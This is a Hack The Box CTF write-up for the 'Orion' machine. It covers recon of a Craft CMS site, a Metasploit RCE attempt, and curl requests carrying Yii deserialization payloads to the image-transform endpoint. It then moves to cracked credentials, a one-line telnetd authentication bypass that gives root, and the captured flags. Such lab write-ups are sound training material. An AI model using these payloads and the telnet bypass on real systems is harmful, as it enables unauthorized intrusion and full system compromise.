# HTB - Orion
## General Information

- **Platform:** Hack The Box
- **Difficulty:** Easy
- **Operating System:** Linux
- **Status:** Acitve

## 1. Reconnaissance
IP ADDRESS:  10.129.187.39
### Port Scanning 

We gotta scan that IP 
```nmap 10.129.187.39

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http ``` 

Let's see what we can find from those open ports 

```bash
 nmap -p 22,80 -sC -sV 10.129.187.39```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_hnap-info: ERROR: Script execution failed (use -d to debug)
|_http-server-header: ERROR: Script execution failed (use -d to debug)
|_http-trane-info: ERROR: Script execution failed (use -d to debug)
|_https-redirect: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As you can see the port 22 has a version of OpenSSh 8.9p1 ( ubuntu), then we can't access by here without credentials.
In the 80 port we can see a link for a website. This web is using ngix 1.18.9 ( ubuntu ) 

### Enumeration
At first we have to include the direction to **/etc/hosts **
Im gonna start with a curl:
```bash
curl -I http://orion.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 28 Oct 2026 22:16:06 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Robots-Tag: none
X-Powered-By: Craft CMS
```
With this information we can see this page was built with Craft CMS ( based on PHP ).

I'm looking for something inside the web's code and I found this little code inside main.js
```bash

try {
            const response = await fetch('/api/contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ name, email, message })
            });
``` 
maybe that POST /api/contact could be useful later..

At this point im gonna see if there is any directory or file hide in this server:
```bash
ffuf -u http://orion.htb/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/common.txt -fc 404
```
I got this:
```bash

.gitmodules             [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 149ms]
.gitignore              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 150ms]
.gitkeep                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 149ms]
.git                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 150ms]
.git-rewrite            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 154ms]
.gitk                   [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.gitattributes          [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.git/logs/              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.git/index              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.git/HEAD               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.git_release            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 155ms]
.gitconfig              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 158ms]
.gitreview              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 157ms]
.git/config             [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 158ms]
.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 158ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 244ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 151ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 636ms]
index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 492ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 457ms]
```
After inspecting the web app and its source code I noticed 3 things here;
- /admin directory with status 302; Likely points to a login panel.
- .git directory with status 403; Its an expoed directory, it means some .git files might be accessible.
- index.php with status 200; We knew it, this server must be working with PHP

#### admin 
```bash
curl -I http:/orion.htb/admin
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 28 Oct 2026 22:32:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: 0
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
X-Robots-Tag: none
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Powered-By: Craft CMS
Location: http://orion.htb/admin/login
```
Using that path it redirects to login ( login panel), so we have see the login page.

In this section im gonna use metasploit:

```bash
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
rhosts => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rport 80
rport => 80
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost 10.10.15.186
lhost => 10.10.15.186
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit 
```
Results :
```bash
[*] Started reverse TCP handler on 10.10.15.186:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (72686 bytes) to 10.129.187.39
[*] Sending stage (72686 bytes) to 10.129.187.39
[-] Meterpreter session 2 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 2 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
[*] 10.129.187.39 - Meterpreter session 1 closed.  Reason: Died
[-] Meterpreter session 3 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 3 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
[-] Meterpreter session 4 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 4 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
[-] Meterpreter session 5 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 5 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
[-] Meterpreter session 6 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 6 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
[-] Meterpreter session 7 is not valid and will be closed
[*] 10.129.187.39 - Meterpreter session 7 closed.
[*] Sending stage (72686 bytes) to 10.129.187.39
```
Then I'd say it didnt work.

Let's continue with  /admin/login
```bash
curl -s -c cookies.txt -b cookies.txt http://orion.htb/admin/login -o login_page.html
```
inside the cookies.txt we found this:
```
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_orion.htb	FALSE	/	FALSE	0	CRAFT_CSRF_TOKEN	1725606bd4d7b18bc45007c8a3ed458796f4f92f476c04f2e8fcc24eb7d2ee64a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22Jjp2fSJeqSdkIJJAxFIjKoVNTA2s7PzUR7K4zdVH%22%3B%7D
#HttpOnly_orion.htb	FALSE	/	FALSE	0	CraftSessionId	t3blnkcoh3gkn3r48jgo6123df
```
** CraftSessionId:t3blnkcoh3gkn3r48jgo6123df **
** CRAFT_CSRF_TOKEN :  1725606bd4d7b18bc45007c8a3ed458796f4f92f476c04f2e8fcc24eb7d2ee64a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TO> **

However, we need the CSRF in text:
```bash
grep -o '"csrfTokenValue":"[^"]*"' login_page.html
"csrfTokenValue":"RLlPVMN3DI9kn2v1POaf07iHaNB1novJCjJI2hXx7TZNKUxB2oOriw7TP2alJEbqFcwPnnWs1ZLAwSG6PvHdh15zeqkioZdjHx4HdaDn_cM="
```

```bash
curl -s -b cookies.txt "http://orion.htb/index.php?p=admin/dashboard&a=<?php+system('whoami');+?>"
```
```bash
curl -s -X POST http://orion.htb/actions/assets/generate-transform \
  -b cookies.txt \
  -H "X-CSRF-Token: RLlPVMN3DI9kn2v1POaf07iHaNB1novJCjJI2hXx7TZNKUxB2oOriw7TP2alJEbqFcwPnnWs1ZLAwSG6PvHdh15zeqkioZdjHx4HdaDn_cM=" \
  -H "Content-Type: application/json" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 1,
        "height": 1,
        "as hack": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [
                {
                    "itemFile": "/tmp/sess_t3blnkcoh3gkn3r48jgo6123df"
                }
            ]
        }
    }
}'
```

```bash
curl -s -X POST http://orion.htb/actions/assets/generate-transform \
  -b cookies.txt \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 1,
        "height": 1,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}' | grep -i -C 3 "error"
<tr><td class="e">cgi.nph</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">cgi.redirect_status_env</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">cgi.rfc2616_headers</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">fastcgi.error_header</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">fastcgi.logging</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">fpm.config</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
--
<tr><td class="e">default_mimetype</td><td class="v">text/html</td><td class="v">text/html</td></tr>
<tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">display_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">display_startup_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">doc_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_ext</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">enable_dl</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">enable_post_data_reading</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">error_append_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_log</td><td class="v">/var/www/html/craft/storage/logs/phperrors.log</td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_log_mode</td><td class="v">0644</td><td class="v">0644</td></tr>
<tr><td class="e">error_prepend_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_reporting</td><td class="v">8191</td><td class="v">22527</td></tr>
<tr><td class="e">expose_php</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">extension_dir</td><td class="v">/usr/lib/php/20220829</td><td class="v">/usr/lib/php/20220829</td></tr>
<tr><td class="e">fiber.stack_size</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
--
<tr><td class="e">highlight.html</td><td class="v"><font style="color: #000000">#000000</font></td><td class="v"><font style="color: #000000">#000000</font></td></tr>
<tr><td class="e">highlight.keyword</td><td class="v"><font style="color: #007700">#007700</font></td><td class="v"><font style="color: #007700">#007700</font></td></tr>
<tr><td class="e">highlight.string</td><td class="v"><font style="color: #DD0000">#DD0000</font></td><td class="v"><font style="color: #DD0000">#DD0000</font></td></tr>
<tr><td class="e">html_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">ignore_repeated_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_repeated_source</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">implicit_flush</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">include_path</td><td class="v">.:/usr/share/php</td><td class="v">.:/usr/share/php</td></tr>
<tr><td class="e">input_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">log_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mail.add_x_header</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mail.force_extra_parameters</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mail.log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
--
<tr><td class="e">user_ini.cache_ttl</td><td class="v">300</td><td class="v">300</td></tr>
<tr><td class="e">user_ini.filename</td><td class="v">.user.ini</td><td class="v">.user.ini</td></tr>
<tr><td class="e">variables_order</td><td class="v">GPCS</td><td class="v">GPCS</td></tr>
<tr><td class="e">xmlrpc_error_number</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xmlrpc_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">zend.assertions</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">zend.detect_unicode</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.enable_gc</td><td class="v">On</td><td class="v">On</td></tr>
--
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">intl.default_locale</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">intl.error_level</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">intl.use_exceptions</td><td class="v">Off</td><td class="v">Off</td></tr>
</table>
<h2><a name="module_json" href="#module_json">json</a></h2>
--
<tr><td class="e">opcache.enable</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.enable_cli</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.enable_file_override</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.file_cache</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.file_cache_consistency_checks</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.file_cache_only</td><td class="v">Off</td><td class="v">Off</td></tr>
--
</p>
</td></tr>
</table>
</div></body></html><pre>An Error occurred while handling another error:
yii\web\HeadersAlreadySentException: Headers already sent in /var/www/html/craft/vendor/guzzlehttp/psr7/src/FnStream.php on line 57. in /var/www/html/craft/vendor/yiisoft/yii2/web/Response.php:369
Stack trace:
#0 /var/www/html/craft/vendor/yiisoft/yii2/web/Response.php(342): yii\web\Response-&gt;sendHeaders()
#1 /var/www/html/craft/vendor/yiisoft/yii2/web/ErrorHandler.php(136): yii\web\Response-&gt;send()
#2 /var/www/html/craft/vendor/craftcms/cms/src/web/ErrorHandler.php(226): yii\web\ErrorHandler-&gt;renderException()
#3 /var/www/html/craft/vendor/yiisoft/yii2/base/ErrorHandler.php(152): craft\web\ErrorHandler-&gt;renderException()
#4 /var/www/html/craft/vendor/craftcms/cms/src/web/ErrorHandler.php(102): yii\base\ErrorHandler-&gt;handleException()
#5 [internal function]: craft\web\ErrorHandler-&gt;handleException()
#6 {main}
Previous exception:
yii\base\InvalidConfigException: Unsupported configuration type: object in /var/www/html/craft/vendor/yiisoft/yii2/BaseYii.php:353
--
#21 /var/www/html/craft/web/index.php(12): yii\base\Application-&gt;run()
#22 {main}

Next yii\web\ServerErrorHttpException: Image transform cannot be created. in /var/www/html/craft/vendor/craftcms/cms/src/controllers/AssetsController.php:1124
Stack trace:
#0 [internal function]: craft\controllers\AssetsController-&gt;actionGenerateTransform()
#1 /var/www/html/craft/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array()
```

By taking advantage of an object deserialization vulnerability in the Yii framework through the image transform endpoint (/actions/assets/generate-transform), we were able to inject a payload using GuzzleHttp\Psr7\FnStream.

```bash
curl -s -X POST http://orion.htb/actions/assets/generate-transform \
  -b cookies.txt \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 1,
        "height": 1,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}'
```

Once inside the application using RCE, we checked the Craft CMS configuration files in the root folder (/var/www/html/craft/), especially the .env file or config/db.php, where database credentials are saved
After checking the database, we got the password hashes for the Craft CMS users. By cracking the hash for the system user adam, we found his plain text password:
User: adam
Password: darkangel

So we have to use those credentials via ssh

``` ssh adam@orion.htb```

Using cat user.txt we cann see the hash

```adam@orion:~$ cat user.txt 
1c04cd197c4a047ad7420f4cb75228ce
````
But there is something else, we need to discover the root hash.

## Privilage Escalation

During the internal enumeration phase, we found a service running only locally (localhost / 127.0.0.1):

- Service: Telnet (GNU Inetutils telnetd)
- Port: 23 (Local only)
- Version: 2.7

This service had an authentication bypass vulnerability (CVE-2026-24061).
 By exploiting this bug through an argument injection in the USER environment variable, we bypassed the login and got an interactive shell directly as root:
```bash
USER='-f root' telnet -a 127.0.0.1```

we found 
``` bash

root@orion:~# cat /root/root.txt 
4366a0cfa42c47c6713dde0f48581a89
```
 
## 5. Lessons Learned
Deserialization: At first, the GuzzleHttp payload looked like pure magic and was super confusing. Working on this machine forced me to actually learn how PHP magic methods (like __destruct and __construct) work in frameworks like Yii and Craft CMS, instead of just copying and pasting exploits without knowing what they do.

Using searchsploit Better: This CTF was great practice for learning how to use searchsploit correctly. I learned how to search and filter for specific software versions (like Craft CMS or Telnet) to find the right CVEs and public exploits.

## References

- Craft CMS / Yii RCE (CVE-2025-32432): [Advisory / Writeup reference for the deserialization flaw]
- GNU Inetutils Telnetd Auth Bypass (CVE-2026-24061): [Reference for the local privilege escalation vector]
- Hack The Box - Orion: https://www.hackthebox.com
